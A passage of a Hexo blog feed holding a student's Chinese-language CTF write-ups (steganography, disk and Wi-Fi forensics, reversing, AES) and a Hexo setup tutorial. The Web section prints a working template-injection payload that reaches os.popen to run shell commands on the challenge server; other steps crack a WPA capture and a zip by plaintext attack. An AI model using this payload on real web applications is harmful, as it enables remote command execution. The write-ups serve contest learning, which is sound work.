class="line">pciBridge0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"17"</span></span><br><span class="line">pciBridge4<span class="selector-class">.pciSlotNumber</span> = <span class="string">"21"</span></span><br><span class="line">pciBridge5<span class="selector-class">.pciSlotNumber</span> = <span class="string">"22"</span></span><br><span class="line">pciBridge6<span class="selector-class">.pciSlotNumber</span> = <span class="string">"23"</span></span><br><span class="line">pciBridge7<span class="selector-class">.pciSlotNumber</span> = <span class="string">"24"</span></span><br><span class="line">scsi0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"16"</span></span><br><span class="line">vmci0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"32"</span></span><br><span class="line">sata0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"33"</span></span><br><span class="line">vmci0<span class="selector-class">.id</span> = <span class="string">"-119750326"</span></span><br><span class="line">monitor<span class="selector-class">.phys_bits_used</span> = <span class="string">"43"</span></span><br><span class="line">vmotion<span class="selector-class">.checkpointFBSize</span> = <span class="string">"4194304"</span></span><br><span class="line">vmotion<span class="selector-class">.checkpointSVGAPrimarySize</span> = <span class="string">"134217728"</span></span><br><span class="line">cleanShutdown = <span class="string">"TRUE"</span></span><br><span class="line">softPowerOff = <span class="string">"FALSE"</span></span><br><span class="line">svga<span class="selector-class">.guestBackedPrimaryAware</span> = <span class="string">"TRUE"</span></span><br><span class="line">rollingTier0<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br><span class="line">rollingTier1<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br><span class="line">rollingTier2<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>ps:注意用py3,用py2总是报错~同时要把中文随便改成英文，不然编码错误</li></ul><ol start="8"><li><p>接下来就是配置CD-ROM了，看了一下自己的kali的vmx配置，主要多了如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sata0:<span class="number">0</span><span class="selector-class">.deviceType</span> = <span class="string">"cdrom-image"</span></span><br><span class="line">sata0:<span class="number">0</span><span class="selector-class">.fileName</span> = <span class="string">"D:\tongyongPE\kali-linux-2017.2-amd64.iso"</span></span><br><span class="line">sata0:<span class="number">0</span><span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br></pre></td></tr></table></figure></li><li><p>把它加到解密出来的vmx文件，然后再用bibinb密码加密回去</p><blockquote><p>python3 main.py -e -D “Ubuntu 64-bit” -p bibinb dec.vmx myenc.mvx</p></blockquote></li><li>将’myenc.mvx’替换掉原来的’Ubuntu 64-bit.vmx’</li><li>在打开，发现<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205191658.png?raw=true" alt=""></li><li>进入系统的过程按ESC进入Boot Menu,选择CD-ROM Drive,然后选择第一个<br><img src="https://lzy-wi.github.io/img/2018-12-03/5.png" alt=""></li><li>进入系统后看到一个20GB的磁盘,然后进去搜flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205192243.png?raw=true" alt=""></li><li>4个文件放到一起打开<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205192237.png?raw=true" alt=""></li></ol><ul><li>大佬太强~！！</li></ul><h2 id="Traffic-Light"><a href="#Traffic-Light" class="headerlink" title="Traffic_Light"></a>Traffic_Light</h2><ol><li>题目给了一个红绿灯的gif文件</li><li>看了一下有1168帧<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193043.png?raw=true" alt=""></li><li>经过测试，最后发现绿灯为0，红灯为1，黄灯为空格</li><li>手动太累，还是写代码吧<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193039.png?raw=true" alt=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFileMd5</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filename):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    myhash = hashlib.md5()</span><br><span class="line">    f = open(filename,<span class="string">'rb'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        b = f.read(<span class="number">8096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        myhash.update(b)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> myhash.hexdigest()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1168</span>):</span><br><span class="line">    filepath=<span class="string">"Traffic_Light/IMG%05d.bmp"</span>%i</span><br><span class="line">    <span class="keyword">if</span> GetFileMd5(filepath)==<span class="string">"30a63c9d2ab0f27742a56ed5817723f8"</span>:    <span class="comment">#green</span></span><br><span class="line">        flag += <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">elif</span> GetFileMd5(filepath)==<span class="string">"fe8ab48b0f01daf1015607fdfa135621"</span>:  <span class="comment">#red</span></span><br><span class="line">        flag += <span class="string">"1"</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">FLAG=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)/<span class="number">8</span>):</span><br><span class="line">    FLAG+=chr(int(flag[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="keyword">print</span> FLAG</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193205.png?raw=true" alt=""></p><h2 id="GreatWall"><a href="#GreatWall" class="headerlink" title="GreatWall"></a>GreatWall</h2><ol><li>题目给一张长城的png，4M多，简单binwalk没发什么，考虑LSB<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193823.png?raw=true" alt=""></li><li>保存下来继续binwalk得到一张图片<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193938.png?raw=true" alt=""></li><li>长杠为1短杠为0,+为分隔符,好像只能手工写下来<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193942.png?raw=true" alt=""></li></ol><h2 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s_this"></a>What’s_this</h2><ol><li>题目拿到一张图片What’s_this.jpg</li><li>binwalk，foremost得到<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194518.png?raw=true" alt=""></li><li>打开word文档，找到隐藏信息(并没卵用)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194525.png?raw=true" alt=""></li><li>docx后缀改zip，找到一个”有用的文件”I_Love_You.emf<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194924.png?raw=true" alt=""></li><li>再看2-stage.what这个文件很奇怪，JPG头，PNG尾，并且和zip2.zip里面的2-stage字节大小相同，但crc32不同，估计将2-stage.what改为PNG头后进行明文攻击<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194530.png?raw=true" alt=""><br>改为如下<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194534.png?raw=true" alt=""></li><li>然后改后缀为png能打开(并没什么卵用)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194538.png?raw=true" alt=""></li><li>但是可以发现此时2-stage.png和zip2.zip里面的2-stage的CRC32相同，明文攻击得到zip2.zip密码为Hello_Hi</li><li>得到如下(感觉被戏耍~，一堆没用的信息)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194542.png?raw=true" alt=""></li><li>一下子没了思路，滚去睡觉</li><li>后来官方提示cloacked-pixel，用这个工具对2-stage.png提取，密码为Hello_Hi<blockquote><p>python lsb.py extract 2-stage.png out Hello_Hi</p></blockquote></li></ol><p><a href="https://github.com/livz/cloacked-pixel" target="_blank" rel="noopener">友情链接</a></p><ol start="11"><li>得到加密压缩包zip3.zip和zip4.zip</li><li>zip3.zip用CRC32碰撞得出文本内容为girl同时也是zip4的密码</li><li>很遗憾得到fake flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194546.png?raw=true" alt=""></li><li><p>此时“有用的文件”作用就来了，发现I_Love_You.emf和zip4.zip字节相同，尝试异或两个文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">"I_Love_You.emf"</span>,<span class="string">"rb"</span>)</span><br><span class="line">text1=f1.<span class="built_in">read</span>()</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">"zip4.zip"</span>,<span class="string">"rb"</span>)</span><br><span class="line">text2=f2.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">data=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(text1)):</span><br><span class="line">    data+=chr(ord(text1[i])^ord(text2[i]))</span><br><span class="line"></span><br><span class="line">f3=<span class="built_in">open</span>(<span class="string">"flag.zip"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f3.<span class="built_in">write</span>(data)</span><br><span class="line"></span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line">f2.<span class="built_in">close</span>()</span><br><span class="line">f3.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure></li><li><p>Get flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194549.png?raw=true" alt=""></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;hack1t-复现队里大佬的&quot;&gt;&lt;a href=&quot;#hack1t-复现队里大佬的&quot; class=&quot;headerlink&quot; title=&quot;hack1t(复现队里大佬的)&quot;&gt;&lt;/a&gt;hack1t(复现队里大佬的)&lt;/h2&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hxb2018部分writeup</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/11/23/hxb2018%E9%83%A8%E5%88%86writeup/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/11/23/hxb2018部分writeup/</id>
    <published>2018-11-23T12:16:16.000Z</published>
    <updated>2018-11-23T12:21:47.626Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><blockquote><p>流量取证，这个流量包中隐藏着一些秘密，你能找出来吗？<br><a id="more"></a></p><ol><li>拿到一个pacp流量包打开,发现全是802.11协议的,是WALN无线报文，并且经过加密，先解密</li><li>上kali用aircrack-ng直接跑</li></ol><ul><li>之前师兄的几个字典都不行，后来发现kali自带的很不错<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201757.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201807.png?raw=true" alt=""></li></ul><ol start="3"><li>wireshark导入密钥<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201810.png?raw=true" alt=""></li><li>导入后发现内容多了许多,字符串搜索flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201813.png?raw=true" alt=""></li></ol></blockquote><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><blockquote><p>磁盘隐写，这个磁盘上隐藏着一些秘密，你能找出来吗？<br><!-- more --></p><ol><li>题目给了一个-flat.vmdk文件,-flat.vmdk文件,-flat.vmdk文件(坑死了，简单的题目复杂化~)</li></ol><ul><li>本菜鸟本着面向搜索引擎做题的方法，看到了这个<a href="http://www.voidcn.com/article/p-hdykpjdi-gn.html" target="_blank" rel="noopener">重建虚拟机丢失的虚拟磁盘vmdk</a>，然后各种配置esxi环境失败,到后面也没连上去哈哈</li></ul><ol start="2"><li>正常操作一下，发现360压缩能打开（其它压缩软件貌似打不开的，360NB；后来发现360压缩可以看到NTFS交换数据流隐写的,如下面的ADS）<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120203732.png?raw=true" alt=""></li><li>flag0-3.txt都发现flag is not here;are you kidding?</li><li>然后看到flag0-3.txt:ads,打开发现是不可打印字符<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120204610.png?raw=true" alt=""></li><li>用winhex打开发现一串二进制数，把4个文件的二进制数连起来转为ascii即可<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120204747.png?raw=true" alt=""></li></ol><ul><li>还是太菜了，自从护网杯那道内存取证，一直对取证题敬畏，谁会想到这道题这么简单~</li></ul></blockquote><h2 id="Hidden-Write"><a href="#Hidden-Write" class="headerlink" title="Hidden Write"></a>Hidden Write</h2><blockquote><p>没有套路，很常规的隐写，注意看图片末尾</p><ol><li>题目给了一张龙猫的图片，放进winhex看一下<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123173901.png?raw=true" alt=""></li><li>发现3个IHDR和IEND，理论存在3张图片，但binwalk只能得到原图一张，发现后两张少了PNG头，补上<br>89504E470D0A1A0A</li><li>成功binwalk出3张图片<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123173909.png?raw=true" alt=""></li><li>在分离出的第二张图片LSB发现一部分flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174629.png?raw=true" alt=""></li><li>第一和第三张是盲水印(字节小是原图，大有水印)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174632.png?raw=true" alt=""></li></ol><ul><li><a href="https://github.com/Cy9nusG4rd3n/BlindWaterMark" target="_blank" rel="noopener">盲水印脚本</a></li></ul><ol start="6"><li>在最原始原图未发现最后一部分flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174634.png?raw=true" alt=""></li></ol></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="XmeO"><a href="#XmeO" class="headerlink" title="XmeO"></a>XmeO</h2><ol><li><p>注册账号，模板注入</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;''.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="name">'grep</span> -r -n <span class="string">"hxb"</span> /home').read()&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>show得到flag,或者登陆账号admin密码admin,发现里面有大佬遗留下来的做题痕迹，直接show拿走flag23333<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123180431.png?raw=true" alt=""></p></li></ol><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h2><ol><li>有壳，kali下upx -d去壳</li><li>将数据提取出来，附上大佬脚本<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123182337.png?raw=true" alt=""></li></ol><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Common-Crypto"><a href="#Common-Crypto" class="headerlink" title="Common Crypto"></a>Common Crypto</h2><ol><li>密码学是个exe？不高兴又是Re</li><li>ida打开程序大概知道是AES加密，从==sub_140001000== 中也可以看到一些赋值，估计是密钥<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123194308.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123194545.png?raw=true" alt=""></li><li>对于密文，前半部分是AES加密，后半部分则是<strong>decode(‘hex’)</strong></li><li>脚本附上<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">key = '\<span class="keyword">x</span><span class="number">1</span>b\<span class="keyword">x</span><span class="number">2</span>e\<span class="keyword">x</span><span class="number">35</span>\<span class="keyword">x</span><span class="number">46</span>\<span class="keyword">x</span><span class="number">58</span>\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">86</span>\<span class="keyword">x</span><span class="number">9</span>b\xa<span class="number">7</span>\xb<span class="number">5</span>\xc<span class="number">8</span>\xd<span class="number">9</span>\xef\xff\<span class="keyword">x</span><span class="number">0</span><span class="keyword">c</span>'</span><br><span class="line">text='<span class="number">8</span>aeb<span class="number">45</span><span class="keyword">c</span><span class="number">62003</span>ba<span class="number">52e46</span><span class="keyword">c</span><span class="number">9600</span>b<span class="number">3699</span>b<span class="number">8</span><span class="keyword">c</span><span class="number">30386334623434393136633963356136</span>'</span><br><span class="line">ciphertext = text.decode('hex')</span><br><span class="line">decodesys = AES.new(key)</span><br><span class="line">print decodesys.decrypt(ciphertext)[:<span class="number">16</span>] + ciphertext[<span class="number">-16</span>:] + '&#125;'</span><br><span class="line">#hxb<span class="number">2018</span>&#123;d<span class="number">9e801</span>ec<span class="number">08</span><span class="keyword">c</span><span class="number">4</span>b<span class="number">44916</span><span class="keyword">c</span><span class="number">9</span><span class="keyword">c</span><span class="number">5</span>a<span class="number">6</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><p><a href="https://rhythmmark.github.io//ReReReeeeeeee/" target="_blank" rel="noopener">大佬的详细WP</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是太菜了，比赛期间本菜鸡都依靠强大的队友瑟瑟发抖的划水，别的大佬都在日主办方服务器~<br><img src="https://github.com/RhythmMark/hello-world/blob/master/pictures/hx1.png?raw=true" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;Flow&quot;&gt;&lt;a href=&quot;#Flow&quot; class=&quot;headerlink&quot; title=&quot;Flow&quot;&gt;&lt;/a&gt;Flow&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;流量取证，这个流量包中隐藏着一些秘密，你能找出来吗？&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>用hexo搭建本地博客</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/11/11/%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E5%8D%9A%E5%AE%A2/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/11/11/用hexo搭建本地博客/</id>
    <published>2018-11-11T07:15:12.000Z</published>
    <updated>2018-11-23T12:00:30.172Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="为什么搭博客？"><a href="#为什么搭博客？" class="headerlink" title="为什么搭博客？"></a>为什么搭博客？</h1><p><del>还不是因为无聊，学习是不可能的，这辈子都不可能学习；打LOL又嫌舍友太菜。</del><br>开个玩笑，搭建自己的博客主要还是因为记录下自己的学习成长过程嘛，队里的大佬都有自己的Blog，自己也不好意思落下，有空的上传下自己的做题的writeup或复现还是不错的。<br><a id="more"></a></p><h1 id="什么是Hexo？"><a href="#什么是Hexo？" class="headerlink" title="什么是Hexo？"></a>什么是Hexo？</h1><p><del>我不知道，网上教程多</del></p><blockquote><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p></blockquote><h1 id="前提环境"><a href="#前提环境" class="headerlink" title="前提环境"></a>前提环境</h1><ol><li><a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a></li><li><a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a></li></ol><ul><li><p>ps:我是在Windows下做的，linux用户只需(git自带)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install nodejs</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install npm</span><br></pre></td></tr></table></figure></li><li><p>出现以下情况则安装成功</p></li></ul><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111142616.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111142630.png?raw=true" alt=""></p><ul><li>然后你就可以快乐地在一个新文件夹里右键Git Bash Here<blockquote><p>$ npm install -g hexo-cli</p></blockquote></li></ul><p>成功如下</p><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111143118.png?raw=true" alt=""></p><h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><ol><li>在想要建站的文件夹中(必须是空文件夹)输入如下<blockquote><p>hexo init #初始化该文件夹,需要点时间<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111144359.png?raw=true" alt=""></p></blockquote></li><li><p>在文件夹发现多了些文件目录如下</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span></span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></li><li><p>_config.yml是网站配置信息<br><a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">详情</a></p></li><li>继续刚才的文件夹输入如下安装组件<blockquote><p>npm install<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145232.png?raw=true" alt=""></p></blockquote></li><li>生成静态文件和启动服务器<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo s</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145616.png?raw=true" alt=""></p><ol start="6"><li>浏览器输入<a href="http://localhost:4000/出现如下，恭喜博客初步建成" target="_blank" rel="noopener">http://localhost:4000/出现如下，恭喜博客初步建成</a><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145619.png?raw=true" alt=""></li></ol><h1 id="下面介绍一些常用hexo命令"><a href="#下面介绍一些常用hexo命令" class="headerlink" title="下面介绍一些常用hexo命令"></a>下面介绍一些常用hexo命令</h1><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><blockquote><p>$ hexo new [layout] <title></title></p></blockquote><p>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><blockquote><p>$ hexo generate</p></blockquote><p>生成静态文件,等价于<strong>hexo g</strong></p><h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><blockquote><p>$ hexo server</p></blockquote><p>启动服务器等价于<strong>hexo s</strong>。默认情况下，访问网址为： <a href="http://localhost:4000/。" target="_blank" rel="noopener">http://localhost:4000/。</a></p><h2 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h2><blockquote><p>$ hexo clean</p></blockquote><ul><li>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</li><li>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</li></ul><h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><blockquote><p>hexo deploy</p></blockquote><p>部署网站。等价于<strong>hexo d</strong></p><ul><li>ps:用这个命令要先安装扩展<blockquote><p>npm install hexo-deployer-git –save</p></blockquote></li></ul><h1 id="部署到网站的一般流程"><a href="#部署到网站的一般流程" class="headerlink" title="部署到网站的一般流程"></a>部署到网站的一般流程</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo clean</span></span><br><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo d</span></span><br></pre></td></tr></table></figure><p>不过此前一般在本地测试<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo s</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
